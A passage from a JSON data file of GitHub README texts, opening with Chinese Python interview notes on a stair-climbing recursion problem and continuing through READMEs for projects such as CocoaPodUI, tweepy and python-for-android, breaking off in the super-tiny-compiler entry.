234.\u9752\u86d9\u8df3\u53f0\u9636\u95ee\u9898\n\n\u4e00\u53ea\u9752\u86d9\u8981\u8df3\u4e0an\u5c42\u9ad8\u7684\u53f0\u9636\uff0c\u4e00\u6b21\u80fd\u8df3\u4e00\u7ea7\uff0c\u4e5f\u53ef\u4ee5\u8df3\u4e24\u7ea7\uff0c\u8bf7\u95ee\u8fd9\u53ea\u9752\u86d9\u6709\u591a\u5c11\u79cd\u8df3\u4e0a\u8fd9\u4e2an\u5c42\u53f0\u9636\u7684\u65b9\u6cd5\uff1f\n\n\u65b9\u6cd51\uff1a\u9012\u5f52\n\n\u8bbe\u9752\u86d9\u8df3\u4e0an\u7ea7\u53f0\u9636\u6709f(n)\u79cd\u65b9\u6cd5\uff0c\u628a\u8fd9n\u79cd\u65b9\u6cd5\u5206\u4e3a\u4e24\u5927\u7c7b\uff0c\u7b2c\u4e00\u79cd\u6700\u540e\u4e00\u6b21\u8df3\u4e86\u4e00\u7ea7\u53f0\u9636\uff0c\u8fd9\u7c7b\u5171\u6709f(n-1)\u79cd\uff0c\u7b2c\u4e8c\u79cd\u6700\u540e\u4e00\u6b21\u8df3\u4e86\u4e24\u7ea7\u53f0\u9636\uff0c\u8fd9\u79cd\u65b9\u6cd5\u5171\u6709f(n-2)\u79cd\uff0c\u5219\u5f97\u51fa\u9012\u63a8\u516c\u5f0ff(n)=f(n-1) + f(n-2),\u663e\u7136f(1)=1,f(2)=2\uff0c\u8fd9\u79cd\u65b9\u6cd5\u867d\u7136\u4ee3\u7801\u7b80\u5355\uff0c\u4f46\u6548\u7387\u4f4e\uff0c\u4f1a\u8d85\u51fa\u65f6\u95f4\u4e0a\u9650\n\n```python\nclass Solution:\n    def climbStairs(self,n):\n        if n ==1:\n            return 1\n        elif n==2:\n            return 2\n        else:\n            return self.climbStairs(n-1) + self.climbStairs(n-2)\n```\n\n\u65b9\u6cd52\uff1a\u7528\u5faa\u73af\u6765\u4ee3\u66ff\u9012\u5f52\n\n```python\nclass Solution:\n    def climbStairs(self,n):\n        if n==1 or n==2:\n            return n\n        a,b,c = 1,2,3\n        for i in range(3,n+1):\n            c = a+b\n            a = b\n            b = c\n        return c\n```\n\n### 235.\u4e24\u6570\u4e4b\u548c Two Sum\n\n\n\n### 236.\u641c\u7d22\u65cb\u8f6c\u6392\u5e8f\u6570\u7ec4 Search in Rotated Sorted Array\n### 237.Python\u5b9e\u73b0\u4e00\u4e2aStack\u7684\u6570\u636e\u7ed3\u6784\n### 238.\u5199\u4e00\u4e2a\u4e8c\u5206\u67e5\u627e\n### 239.set \u7528 in \u65f6\u95f4\u590d\u6742\u5ea6\u662f\u591a\u5c11\uff0c\u4e3a\u4ec0\u4e48\uff1f\n### 240.\u5217\u8868\u4e2d\u6709n\u4e2a\u6b63\u6574\u6570\u8303\u56f4\u5728[0\uff0c1000]\uff0c\u8fdb\u884c\u6392\u5e8f\uff1b\n### 241.\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u4e2d\u6709\u7ec4\u5408\u548c\u7ee7\u627f\u7684\u65b9\u6cd5\u5b9e\u73b0\u65b0\u7684\u7c7b\n## \u5927\u6570\u636e\n### 242.\u627e\u51fa1G\u7684\u6587\u4ef6\u4e2d\u9ad8\u9891\u8bcd\n### 243.\u4e00\u4e2a\u5927\u7ea6\u6709\u4e00\u4e07\u884c\u7684\u6587\u672c\u6587\u4ef6\u7edf\u8ba1\u9ad8\u9891\u8bcd\n### 244.\u600e\u4e48\u5728\u6d77\u91cf\u6570\u636e\u4e2d\u627e\u51fa\u91cd\u590d\u6b21\u6570\u6700\u591a\u7684\u4e00\u4e2a\uff1f\n### 245.\u5224\u65ad\u6570\u636e\u662f\u5426\u5728\u5927\u91cf\u6570\u636e\u4e2d\n\n## \u67b6\u6784\n\n### [Python\u540e\u7aef\u67b6\u6784\u6f14\u8fdb](<https:\/\/zhu327.github.io\/2018\/07\/19\/python%E5%90%8E%E7%AB%AF%E6%9E%B6%E6%9E%84%E6%BC%94%E8%BF%9B\/>)\n\n\u8fd9\u7bc7\u6587\u7ae0\u51e0\u4e4e\u6db5\u76d6\u4e86python\u4f1a\u7528\u7684\u67b6\u6784\uff0c\u5728\u9762\u8bd5\u53ef\u4ee5\u624b\u753b\u67b6\u6784\u56fe\uff0c\u6839\u636e\u81ea\u5df1\u7684\u9879\u76ee\u8c08\u4e0b\u6280\u672f\u9009\u578b\u548c\u4f18\u52a3\uff0c\u9047\u5230\u7684\u5751\u7b49\u3002\u7edd\u5bf9\u52a0\u5206\n"},{"repo":"\/Galeas\/CocoaPodUI","language":"HTML","readme_contents":"***The project support is stopped due to incompatibility of Xcode 8+ with \"classic\" plugins.***\n\nCocoaPodUI\n----------\n\nXcode plugin that implements CocoaPods GUI.\n\nInstallation Guide\n------------------\n\nOpen and build CocoaPodUI project, it will be installed automatically.\n\nUninstall\n---------\nJust remove CocoaPodUI.xcplugin from ~\/Library\/Application Support\/Developer\/Shared\/Xcode\/Plug-ins\n\nVersion History\n---------------\n\n\n- **v.1.2.4**\n    * (no new features, compatibility fixes) Xcode 6.3.2 and 6.4-beta-3 (6E23).\n- **v.1.2.3**\n    * (no new features, compatibility fixes) Xcode 6.3.1 and 6.4-beta-2 support.\n- **v.1.2.2**\n    * (no new features, compatibility fixes) Xcode 6.2 and 6.3-beta-3 support.\n- **v.1.2.1**\n    * Add Xcode 6-beta support.\n- **v.1.2**\n    * New podspec format support.\n    * Checking for outdated Pods and it\u2019s updating.\n    * Badge on Xcode Dock icon with outdated Pods count\n- **v.1.1**\n    * Added multi-target support.\n    * Adding pods to the \u00abInstalled\u00bb-table by drag\u2019n\u2019drop.\n    * Extended editing capabilities of pods.\n- **v.1.0.4 hotfix 2**\n    * Fixed crash when Cocoapods gem file path is not defined and equals nil.\n    * Fixed forming of incorrect text for Podfile.\n- **v.1.0.4 hotfix 1**\n    * \u00abmust provide a launch path\u00bb crash fix.\n- **v.1.0.4**\n    * Avoid complete overwriting an existing Podfile.\n- **v.1.0.3**\n    * Added console output for during pods install.\n- **v.1.0.2 hotfix 2**\n    * Small bug-fix.\n- **v.1.0.2 hotfix 1**\n    * Cocoapod gem search optimization.\n- **v.1.0.2**\n    * Added mechanism that allows user manually define location of Cocoapods\ngem file.\n- **v.1.0.1**\n    * Critical bug fixes.\n        * Fixed crash when Cocoapod gem placed in non-default folder.\n        * Fixed crash when Podfile contains additional pre- or post-install\nscenarios.\n    * Global improvements.\n- **v.1.0**\n    * Basic capabilities: \u00abPodfile\u00bb creation and pods installation. Cleaning up project from pods.\n\n<img src=\"http:\/\/i1199.photobucket.com\/albums\/aa470\/Akki-87\/readme.png\">\n\nSpecial thanks to [kodlian (JMModalOverlay)](https:\/\/github.com\/kodlian\/JMModalOverlay)\n\nAdding support for new builds of XCode\n--------------------------------------\n\nAdd the build UUIDs for the versions of Xcode you wish to support to DVTPlugInCompatibilityUUIDs in CocoaPodUI-Info.plist. This UUID can be found by running command in Terminal:\n\n    defaults read \/Applications\/Xcode.app\/Contents\/Info DVTPlugInCompatibilityUUID\n\n\nSee template project at https:\/\/github.com\/kattrali\/Xcode-Plugin-Template\n\n"},{"repo":"\/yoksel\/flex-cheatsheet","language":"HTML","readme_contents":"# Flexbox cheatsheet\n\nhttp:\/\/yoksel.github.io\/flex-cheatsheet\/\n\nThe list of Flexbox properties with:\n\n* live demos\n* code snippets\n* definitions from the [W3C Flexbox specification](https:\/\/www.w3.org\/TR\/css-flexbox-1\/)\n"},{"repo":"\/sixu05202004\/pythontutorial3","language":null,"readme_contents":"pythontutorial3\n===============\n\npython 3.5.1 tutorial\u4e2d\u6587\u7248\n\n\u539f\u5730\u5740\uff1ahttp:\/\/docs.python.org\/3\/tutorial\/index.html\n\n\u4e2d\u6587\u5730\u5740\uff1ahttp:\/\/www.pythondoc.com\/pythontutorial3\/index.html\n\n**source** \u6587\u4ef6\u5939\u4e0b\u4e3a rst \u683c\u5f0f\u7684\u6587\u6863\uff1b\n\n**html** \u6587\u4ef6\u5939\u4e0b\u4e3a\u4f7f\u7528 Sphinx \u751f\u6210\u7684 html \u683c\u5f0f\u7684\u6587\u6863\uff1b \n\n**docs** \u6587\u4ef6\u5939\u4e3a\u539f\u59cb\u7248\u4e2d\u6587\u7ffb\u8bd1\uff1b\n\n\n\u5907\u6ce8\uff1a\u56e0\u4e3a\u5e73\u65f6\u5de5\u4f5c\u6bd4\u8f83\u5fd9\uff0c\u5982\u679c\u7248\u672c\u6709\u66f4\u65b0\u7684\u8bdd\uff0c\u8bf7\u76f4\u63a5\u63d0\u4ea4 issues\uff0c\u8c22\u8c22\uff01\n"},{"repo":"\/doyoe\/css-handbook","language":"HTML","readme_contents":"# CSS\u53c2\u8003\u624b\u518c\n\n[![AppVeyor](https:\/\/img.shields.io\/appveyor\/ci\/doyoe\/css-handbook.svg)](https:\/\/ci.appveyor.com\/project\/doyoe\/css-handbook)\n\n\u56fd\u5185\u6700\u597d\u7684CSS\u53c2\u8003\u624b\u518c\uff0c\u6301\u7eed\u5c0f\u6b65\u66f4\u65b0\u3002\u3002\u3002\n\n## \u6d4f\u89c8\u5668\u652f\u6301\u7b56\u7565\n\n\u624b\u518c\u5728\u63a5\u4e0b\u6765\u5c06\u53ea\u66f4\u65b0 `IE8.0+`, `Firefox40.0+`, `Chrome40.0+`, `iOS8.0+`, `Android4.4+`, `Android Chrome28.0+`, `Opera40.0+`\uff08Opera\u4ece15.0\u5f00\u59cb\u8f6c\u5165webkit\u9635\u8425\uff09\u7684\u652f\u6301\u6570\u636e\uff0c\u4f4e\u4e8e\u8fd9\u4e9b\u7248\u672c\u7684\u6570\u636e\u5c06\u4e0d\u518d\u66f4\u65b0\uff0c\u5171\u540c\u671f\u671b\u672a\u6765\u524d\u7aef\u7684\u73af\u5883\u8d8a\u6765\u8d8a\u597d\u3002\n\n\u5bf9\u4e8e `IE` \u548c `Edge`\uff0c\u624b\u518c\u662f\u5408\u5e76\u5230\u4e00\u8d77\u4f53\u73b0\u7684\u3002`IE11.0 \u53ca\u4e4b\u524d` \u7684\u7248\u672c\u4e3a `IE \u6d4f\u89c8\u5668`\uff0c`IE12.0 \u53ca\u4ee5\u540e` \u7684\u7248\u672c\u4e3a `Edge \u6d4f\u89c8\u5668`\uff0c\u9605\u8bfb\u8005\u53ef\u6839\u636e\u7248\u672c\u6765\u786e\u5b9a\u3002\n\n## \u7248\u672c\u66f4\u65b0\n\n\u624b\u518c\u7684\u53d1\u7248\u5468\u671f\u4e0d\u56fa\u5b9a\uff0c\u4f1a\u89c6\u4e2a\u4eba\u7cbe\u529b\u6216\u66f4\u65b0\u5185\u5bb9\u7684\u91cd\u8981\u6027\u6765\u51b3\u5b9a\u662f\u5426\u53d1\u5e03\u65b0\u7248\u672c\u3002\n\n### \u5386\u53f2\u7248\u672c\uff1a\n\n\u5982\u60f3\u67e5\u770b\u66f4\u591a\u7248\u672c\u53d8\u66f4\u5386\u53f2\uff0c\u8bf7\u67e5\u770b [\u7248\u672c\u53d8\u66f4\u8bb0\u5f55](http:\/\/css.doyoe.com\/introduction\/change-list.htm)\n\n\n## \u95ee\u9898\u53ca\u53cd\u9988\n\n\u5982\u679c\u60a8\u5728\u4f7f\u7528CSS\u53c2\u8003\u624b\u518c\u65f6\u53d1\u73b0\u4e86\u4efb\u4f55\u95ee\u9898\uff0c\u6216\u8005\u6709\u4efb\u4f55\u5e2e\u52a9\u624b\u518c\u66f4\u5b8c\u5584\u7684\u60f3\u6cd5\u548c\u5efa\u8bae\uff0c\u8bf7\u76f4\u63a5\u7ed9\u6211\u4eec\u63d0 [Issues](https:\/\/github.com\/doyoe\/css-handbook\/issues\/new) \u548c [Pull Requests](https:\/\/github.com\/doyoe\/css-handbook\/pulls)\u3002\n\n\n## \u4f5c\u8005\n\n\u675c\u7476\uff0c\u6211\u76ee\u524d\u5c45\u4f4f\u5728\u5317\u4eac\uff0c\u5c31\u804c\u4e8e [Qunar](http:\/\/www.qunar.com)\uff0c\u60a8\u53ef\u4ee5\u5728 [Github](https:\/\/github.com\/doyoe) \u6216\u8005 [Weibo](http:\/\/weibo.com\/doyoe) \u770b\u5230\u6211\u7684\u6700\u8fd1\u52a8\u6001\u3002\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u6211\u7684[\u4e2a\u4eba\u7ad9\u70b9](http:\/\/www.doyoe.com)\uff0c\u535a\u5ba2\uff1a[CSS\u63a2\u7d22\u4e4b\u65c5](http:\/\/blog.doyoe.com)\uff0c[CSS\u53c2\u8003\u624b\u518c](http:\/\/css.doyoe.com) \u548c [Web\u524d\u7aef\u5b9e\u9a8c\u5ba4](http:\/\/demo.doyoe.com) \u7b49\u4fe1\u606f\u4e86\u89e3\u66f4\u591a\u3002\n\n\n## \u7248\u672c\u8bb8\u53ef\n\n\u6e90\u7801\u548c\u6587\u6863\u7248\u6743\u5c5e\u4e8e [doyoe.com](http:\/\/www.doyoe.com)\u3002\u6587\u6863\u53d1\u5e03\u57fa\u4e8e [Apache License 2.0](http:\/\/www.apache.org\/licenses\/LICENSE-2.0) \u5f00\u6e90\u534f\u8bae\u3002"},{"repo":"\/michaelliao\/awesome-python-webapp","language":null,"readme_contents":"awesome-python-webapp\n=====================\n\n\u8fd9\u662f\u201c[\u5c0f\u767d\u7684Python\u6559\u7a0b](http:\/\/www.liaoxuefeng.com\/wiki\/001374738125095c955c1e6d8bb493182103fac9270762a000)\u201d\u4e2d\u201c[\u5b9e\u6218](http:\/\/www.liaoxuefeng.com\/wiki\/001374738125095c955c1e6d8bb493182103fac9270762a000\/001397616003925a3d157284cd24bc0952d6c4a7c9d8c55000)\u201d\u7ae0\u7684\u5b8c\u6574\u7f51\u7ad9 + iOS App\u6e90\u7801\u3002\n\n\u8981\u67e5\u770b\u793a\u4f8b\u7f51\u7ad9\u8fd0\u884c\u6548\u679c\uff0c\u731b\u51fb\uff1a\n\n[http:\/\/awesome.liaoxuefeng.com\/](http:\/\/awesome.liaoxuefeng.com\/)\n\n\u793a\u4f8b\u7f51\u7ad9\u7531[Sina AppEngine](http:\/\/sae.sina.com.cn\/)\u6258\u7ba1\u3002\n\n\u8981\u4e0b\u8f7d\u6e90\u7801\uff0c\u8bf7\u76f4\u63a5\u901a\u8fc7Git\u83b7\u53d6\u6e90\u7801\u3002\n\n\u5b9e\u6218\u7ae0\u8282\u7684\u6bcf\u5929\u7684\u589e\u91cf\u6e90\u7801\u5728\u5206\u652f\u201cday-xx\u201d\u4e2d\u3002\n"},{"repo":"\/kailashahirwar\/cheatsheets-ai","language":null,"readme_contents":"# AI Cheatsheets\n\nEssential Cheat Sheets for deep learning and machine learning engineers\n\nWebsite: https:\/\/aicheatsheets.com\n\n<p align=\"center\">\n  <img width=\"50%\" height=\"auto\" src=\"Triplebyte_logo.png\">\n<\/p>\n<p align=\"center\">\nLooking for a new job? Take Triplebyte\u2019s <a href=\"https:\/\/triplebyte.com\/a\/ZYAvvEc\/d\">quiz<\/a> and get a job at top companies like Adobe, Dropbox and Instacart!\n<\/p>\n\n![website-1](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/screenshots\/website.png)\n\n![website-2](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/screenshots\/website-2.png)\n\n![tensorflow-1](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/screenshots\/tensorflow1.png)\n\nMedium Article: https:\/\/medium.com\/@kailashahirwar\/essential-cheat-sheets-for-machine-learning-and-deep-learning-researchers-efb6a8ebd2e5\n\n![medium-article](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/screenshots\/medium-article.png)\n\nReddit Thread: https:\/\/www.reddit.com\/r\/Python\/comments\/cyslju\/ai_cheatsheets_now_learn_tensorflow_keras_pytorch\/?utm_source=share&utm_medium=web2x\n\n![reddit-post](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/screenshots\/reddit-post.png)\n  \n    \n  - [**Tensorflow**](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/PDFs\/Tensorflow.pdf)<br>\n  - [**Keras**](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/Keras.jpg)<br>\n  - [**Neural Networks Zoo**](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/Neural%20Networks%20Zoo.png)<br>\n  - [**Numpy**](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/Numpy.png)<br>\n  - [**Scipy**](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/Scipy.png)<br>\n  - [**Pandas-1**](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/Pandas-1.jpg)<br>\n  - [**Pandas-2**](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/Pandas-2.jpg)<br>\n  - [**Pandas-3**](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/Pandas-3.png)<br>\n  - [**Scikit-learn**](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/Scikit%20Learn.png)<br>\n  - [**Matplotlib**](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/Matplotlib.png)<br>\n  - [**Seaborn**](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/seaborn.png)<br>\n  - [**ggplot2-1**](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/ggplot2-1.jpg)<br>\n  - [**ggplot2-2**](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/ggplot2-2.jpg)<br>\n  - [**PySpark**](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/PySpark.jpg)<br>\n  - [**PySpark-RDD**](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/PySpark-RDD.png)<br>\n  - [**PySpark-SQL**](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/PySpark-SQL.png)<br>\n  - [**R Studio(dplyr & tidyr)-1**](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/Data%20Wrangling%20with%20dplyr%20and%20tidyr%20-%20R%20Studio-1.jpg)<br>\n  - [**R Studio(dplyr & tidyr)-2**](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/Data%20Wrangling%20with%20dplyr%20and%20tidyr%20-%20R%20Studio-2.jpg)<br>\n  - [**Neural Network Cells**](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/Neural%20Network%20Cells.png)<br>\n  - [**Neural Network Graphs**](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/Neural%20Network%20Graphs.png)<br>\n  - [**Deep Learning Cheat Sheet**](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/Deep%20Learning%20Cheat%20Sheet-Hacker%20Noon.pdf)<br>\n  - [**Dask1**](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/Dask1.png)\n  - [**Dask2**](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/Dask2.png)\n  - [**Dask3**](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/Dask3.png)\n  - [**Dask4**](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/Dask4.png)\n  - [**All Cheat Sheets(PDF)**](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/All%20Cheat%20Sheets.pdf)<br>\n  \n[**Medium Article**](https:\/\/medium.com\/@kailashahirwar\/essential-cheat-sheets-for-machine-learning-and-deep-learning-researchers-efb6a8ebd2e5)\n  \nLicense\n-----------------\n\n[MIT License](https:\/\/github.com\/kailashahirwar\/cheatsheets-ai\/blob\/master\/LICENSE.md)\n\n[AI Cheatsheets](https:\/\/aicheatsheets.com)"},{"repo":"\/ccg2018\/ClashA","language":"HTML","readme_contents":"<h1 align=\"center\">\n  <img src=\"https:\/\/github.com\/Dreamacro\/clash\/raw\/master\/docs\/logo.png\" alt=\"Clash\" width=\"200\">\n  <br>\n  ClashA\n  <br>\n<\/h1>\n\n<h4 align=\"center\">An Android GUI for Clash.<\/h4>\n\n### ClashA will be deprecated soon. For a Clash GUI on Android in active development, use **Clash for Android** developed by Kr328 instead, [Telegram Channel](https:\/\/t.me\/clash_for_android_channel).\n\nClashA final version: 0.0.3+\n\n### Keywords and Useful Links\n- Clash : A multi-platform & rule-base tunnel, [Github](https:\/\/github.com\/Dreamacro\/clash)\n- ClashX for Mac : A GUI of Clash on macOS, [Github](https:\/\/github.com\/yichengchen\/clashX)\n- Clash for Windows :  a GUI of Clash on Windows, [Github](https:\/\/raw.githubusercontent.com\/Fndroid\/clash_for_windows_pkg)\n\n\n### Build\n\n#### Build Dependencies\n\n* JDK 1.8\n* Android SDK\n  - Android NDK\n#### Steps\n* Clone the repo using `git clone --recurse-submodules <repo>` or update submodules using `git submodule update --init --recursive`\n* Build it using Android Studio or gradle script\n\n"},{"repo":"\/tweepy\/tweepy","language":"Python","readme_contents":"Tweepy: Twitter for Python!\n======\n\n[![Build Status](http:\/\/img.shields.io\/travis\/tweepy\/tweepy\/master.svg?style=flat)](https:\/\/travis-ci.org\/tweepy\/tweepy)\n[![Documentation Status](http:\/\/img.shields.io\/badge\/docs-v3.8.0-brightgreen.svg?style=flat)](http:\/\/docs.tweepy.org)\n[![Version](http:\/\/img.shields.io\/pypi\/v\/tweepy.svg?style=flat)](https:\/\/pypi.org\/project\/tweepy\/)\n[![Coverage Status](https:\/\/img.shields.io\/coveralls\/tweepy\/tweepy\/master.svg?style=flat)](https:\/\/coveralls.io\/github\/tweepy\/tweepy?branch=master)\n[![Discord](https:\/\/img.shields.io\/discord\/432685901596852224.svg)](https:\/\/discord.gg\/bJvqnhg)\n\nInstallation\n------------\nThe easiest way to install the latest version\nis by using pip\/easy_install to pull it from PyPI:\n\n    pip install tweepy\n\nYou may also use Git to clone the repository from\nGitHub and install it manually:\n\n    git clone https:\/\/github.com\/tweepy\/tweepy.git\n    cd tweepy\n    python setup.py install\n\nPython 2.7, 3.5, 3.6, 3.7, & 3.8 are supported.\n\nCommunity\n---------\n- [Discord Chat](https:\/\/discord.gg\/bJvqnhg)\n\n"},{"repo":"\/kivy\/python-for-android","language":"Python","readme_contents":"python-for-android\n==================\n\n[![Build Status](https:\/\/travis-ci.org\/kivy\/python-for-android.svg?branch=develop)](https:\/\/travis-ci.org\/kivy\/python-for-android)\n[![Coverage Status](https:\/\/coveralls.io\/repos\/github\/kivy\/python-for-android\/badge.svg?branch=develop&kill_cache=1)](https:\/\/coveralls.io\/github\/kivy\/python-for-android?branch=develop)\n[![Backers on Open Collective](https:\/\/opencollective.com\/kivy\/backers\/badge.svg)](#backers)\n[![Sponsors on Open Collective](https:\/\/opencollective.com\/kivy\/sponsors\/badge.svg)](#sponsors)\n\npython-for-android is a packaging tool for Python apps on Android. You can\ncreate your own Python distribution including the modules and\ndependencies you want, and bundle it in an APK along with your own code.\n\nFeatures include:\n\n-  Support for building with both Python 2 and Python 3.\n-  Different app backends including Kivy, PySDL2, and a WebView with\n   Python webserver.\n-  Automatic support for most pure Python modules, and built in support\n   for many others, including popular dependencies such as numpy and\n   sqlalchemy.\n-  Multiple architecture targets, for APKs optimised on any given\n   device.\n\nFor documentation and support, see:\n\n-  Website: http:\/\/python-for-android.readthedocs.io\n-  Mailing list: https:\/\/groups.google.com\/forum\/#!forum\/kivy-users or\n   https:\/\/groups.google.com\/forum\/#!forum\/python-android.\n\n## Documentation\n\nFollow the [quickstart\ninstructions](<https:\/\/python-for-android.readthedocs.org\/en\/latest\/quickstart\/>)\nto install and begin creating APKs.\n\n**Quick instructions**: install python-for-android with:\n\n    pip install python-for-android\n\n(for the develop branch: `pip install git+https:\/\/github.com\/kivy\/python-for-android.git`)\n\nTest that the install works with:\n\n    p4a --version\n\nTo build any actual apps, **set up the Android SDK and NDK**\nas described in the [quickstart](\n<https:\/\/python-for-android.readthedocs.org\/en\/latest\/quickstart\/#installing-android-sdk>).\n**Use the SDK\/NDK API level & NDK version as in the quickstart,**\nother API levels may not work.\n\nWith everything installed, build an APK with SDL2 with e.g.:\n\n    p4a apk --requirements=kivy --private \/home\/username\/devel\/planewave_frozen\/ --package=net.inclem.planewavessdl2 --name=\"planewavessdl2\" --version=0.5 --bootstrap=sdl2\n\n**For full instructions and parameter options,** see [the\ndocumentation](https:\/\/python-for-android.readthedocs.io\/en\/latest\/quickstart\/#usage).\n\n## Support\n\nIf you need assistance, you can ask for help on our mailing list:\n\n-  User Group: https:\/\/groups.google.com\/group\/kivy-users\n-  Email: kivy-users@googlegroups.com\n\nWe also have [#support Discord channel](https:\/\/chat.kivy.org\/).\n\n## Contributing\n\nWe love pull requests and discussing novel ideas. Check out the Kivy\nproject [contribution guide](http:\/\/kivy.org\/docs\/contribute.html) and\nfeel free to improve python-for-android.\n\nSee [our\ndocumentation](https:\/\/python-for-android.readthedocs.io\/en\/latest\/contribute\/)\nfor more information about the python-for-android development and\nrelease model, but don't worry about the details. You just need to\nmake a pull request, we'll take care of the rest.\n\nThe following mailing list and IRC channel are used exclusively for\ndiscussions about developing the Kivy framework and its sister projects:\n\n-  Dev Group: https:\/\/groups.google.com\/group\/kivy-dev\n-  Email: kivy-dev@googlegroups.com\n\nWe also have [#dev Discord channel](https:\/\/chat.kivy.org\/).\n\n## License\n\npython-for-android is released under the terms of the MIT License.\nPlease refer to the LICENSE file.\n\n## History\n\nIn 2015 these tools were rewritten to provide a new, easier-to-use and\neasier-to-extend interface. If you'd like to browse the old toolchain, its\nstatus is recorded for posterity at at\nhttps:\/\/github.com\/kivy\/python-for-android\/tree\/old_toolchain.\n\nIn the last quarter of 2018 the python recipes were changed. The\nnew recipe for python3 (3.7.1) had a new build system which was\napplied to the ancient python recipe, allowing us to bump the python2\nversion number to 2.7.15. This change unified the build process for\nboth python recipes, and probably solved various issues detected over the\nyears. It should also be mentioned that these **unified python recipes**\nrequire a **minimum target api level of 21**,\n*Android 5.0 - Lollipop*, so in the case that you need to build targeting an\napi level below 21, you should use an older version of python-for-android\n(<=0.7.1).\n\nBe aware that this project is in constant development so, as per time of writing,\nyou should use a minimum on Android's NDK r19, and ``we recommend using NDK r19b``.\nThis is because the toolchains installed by\ndefault with the NDK can be used *in-place* and the python-for-android project\nhas been adapted for that feature. Also be aware that more recent versions of the\nAndroid's NDK may not work.\n\nThose mentioned changes has been done this way to make easier the transition\nbetween python3 and python2. We will slowly phase out python2 support\ntowards 2020...so...if you are using python2 in your projects you should\nconsider migrating it into python3.\n\n## Contributors\n\nThis project exists thanks to all the people who contribute. [[Contribute](CONTRIBUTING.md)].\n<a href=\"https:\/\/github.com\/kivy\/python-for-android\/graphs\/contributors\"><img src=\"https:\/\/opencollective.com\/kivy\/contributors.svg?width=890&button=false\" \/><\/a>\n\n\n## Backers\n\nThank you to all our backers! \ud83d\ude4f [[Become a backer](https:\/\/opencollective.com\/kivy#backer)]\n\n<a href=\"https:\/\/opencollective.com\/kivy#backers\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/kivy\/backers.svg?width=890\"><\/a>\n\n\n## Sponsors\n\nSupport this project by becoming a sponsor. Your logo will show up here with a link to your website. [[Become a sponsor](https:\/\/opencollective.com\/kivy#sponsor)]\n\n<a href=\"https:\/\/opencollective.com\/kivy\/sponsor\/0\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/kivy\/sponsor\/0\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/kivy\/sponsor\/1\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/kivy\/sponsor\/1\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/kivy\/sponsor\/2\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/kivy\/sponsor\/2\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/kivy\/sponsor\/3\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/kivy\/sponsor\/3\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/kivy\/sponsor\/4\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/kivy\/sponsor\/4\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/kivy\/sponsor\/5\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/kivy\/sponsor\/5\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/kivy\/sponsor\/6\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/kivy\/sponsor\/6\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/kivy\/sponsor\/7\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/kivy\/sponsor\/7\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/kivy\/sponsor\/8\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/kivy\/sponsor\/8\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/kivy\/sponsor\/9\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/kivy\/sponsor\/9\/avatar.svg\"><\/a>\n"},{"repo":"\/jamiebuilds\/the-super-tiny-compiler","language":"JavaScript","readme_contents":"[![The Super Tiny Compiler](https:\/\/cloud.githubusercontent.com\/assets\/952783\/21579290\/5755288a-cf75-11e6-90e0-029529a44a38.png)](the-super-tiny-compiler.js)\n\n***Welcome to The Super Tiny Compiler!***\n\nThis is an ultra-simplified example of all the major pieces of a modern 